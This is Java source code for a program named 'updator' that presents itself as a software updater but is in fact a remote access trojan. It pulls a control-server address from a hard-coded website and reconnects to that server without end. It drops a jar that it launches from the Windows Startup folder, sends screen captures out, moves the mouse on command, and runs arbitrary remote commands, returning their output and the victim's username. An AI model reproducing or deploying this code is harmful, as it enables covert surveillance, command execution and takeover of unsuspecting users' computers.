import java.io.*;
import java.net.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.*;
import javax.swing.*;
import javax.imageio.*;

public class updator{
	public static final int version = 1;
	static int id = 0;
	static String connectTo = "";
	
	public static void main(String args[]) throws Exception{
		URL oracle = new URL("http://leedavida.my-free.website/");
        Scanner inSt = new Scanner(oracle.openStream());

        String inputLine = "";
        while (!inputLine.equals("connectTo")){
            inputLine = inSt.next();
			System.out.println(inputLine);
		}		
		
		
		updator.connectTo = inSt.next();
		Socket s = establishTo(updator.connectTo);
		
		setUp(s);		
	}
	public static void copy(InputStream in, OutputStream out) throws IOException {
        byte[] buf = new byte[1024];
        int len = 0;
        while ((len = in.read(buf)) == 1024) {
            out.write(buf, 0, len);
			System.out.println(len);
        }
            out.write(buf, 0, len);
			System.out.println(len);
    }
	public static void setUp(Socket s){
		try{
		PrintStream print = new PrintStream(s.getOutputStream());
		Scanner in = new Scanner(s.getInputStream());
		print.println(updator.version);
		
		if(in.nextBoolean()){
			File update = new File("updator.jar");
			if(!update.exists()){
				update.createNewFile();
			}
			copy(s.getInputStream(), new FileOutputStream(update));
			
			String cmd = "java -jar C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updator.jar";
			Runtime.getRuntime().exec(cmd);
			
			System.exit(0);
		}
		
		(new Thread(new uListener(s))).start();
		(new Thread(new commands(s))).start();
		}catch(Exception e){
			e.printStackTrace();
		}
	}
	public static Socket establishTo(String connectTo){
		Socket s = null;
		try{
			boolean connected = false;
			while(!connected){
				try{
				s = new Socket(connectTo,8889);
				connected = true;
				}catch(Exception e){
					e.printStackTrace();
					System.out.println(connectTo);
				}
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		return s;
	}
}
class uListener implements Runnable{
	Socket s;
	Scanner in;
	public uListener(Socket s){
		this.s = s;
		try{
		in = new Scanner(s.getInputStream());
		
		}catch(IOException e){
			System.out.println("Crap");
		}
	}
	
	public void run(){
		while(true){
			try{
				String type = in.next();
				if(type.equals("com")){
					commands.decode(in.nextLine());
				}
			}catch(NoSuchElementException e){
				System.out.println("GOTCHA");
				
				updator.setUp(updator.establishTo(updator.connectTo));
				break;
			}
		}
	}
}
class commands implements Runnable{
	static int mx = 0;
	static int my = 0;
	
	static boolean send = false;
	
	public static OutputStream outStream;
	
	public commands(Socket s){
		try{
			this.outStream = s.getOutputStream();
		}catch(IOException e){
			e.printStackTrace();
		}
	}
	public void run(){
		try{
			Robot r = new Robot();
			PrintStream out = new PrintStream(outStream);
			
			int counter = 0;
			while(true){		
				try{
					if(commands.mx != 0 || commands.my != 0){
						r.mouseMove(commands.mx, commands.my);
					}
					if(commands.send && counter % 5 == 0){
						Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
						BufferedImage image = r.createScreenCapture(new Rectangle(0,0,(int)size.getWidth(),(int)size.getHeight()));
						ByteArrayOutputStream bOut = new ByteArrayOutputStream();
						
						ImageIO.write(image, "jpg", bOut);
						out.println("image");
						System.out.println(bOut.size());
						out.write(bOut.toByteArray());
						out.flush();
					}
					Thread.sleep(10);
				}catch(Exception e){}
			}
		}catch(Exception e){
			e.printStackTrace();
			System.out.println("Done");
		}
	}
	public static String mouseTo(int x, int y){
		return "com mouse " + x + " " + y;
	}
	public static void decode(String s){
		System.out.println(s);
		Scanner scan = new Scanner(s);
		String type = scan.next();
		
		if(type.equals("mouse")){
			commands.mx = scan.nextInt();
			commands.my = scan.nextInt();
		}else if(type.equals("screen")){
			commands.send = !commands.send;
		}else if(type.equals("powershell")){
			try{
				Process p = Runtime.getRuntime().exec(scan.nextLine());
				
				BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
				String line = null;
				String total = "";
				PrintStream print = new PrintStream(commands.outStream);
				while ((line = in.readLine()) != null) {
					total += line;
				}
				System.out.println(total);
				print.println("info " + total);
			}catch(IOException e){
				e.printStackTrace();
			}
		}else if(type.equals("ping")){
			PrintStream print = new PrintStream(outStream);
			
			print.println("info " + System.getProperty("user.name"));
		}
	}
	
}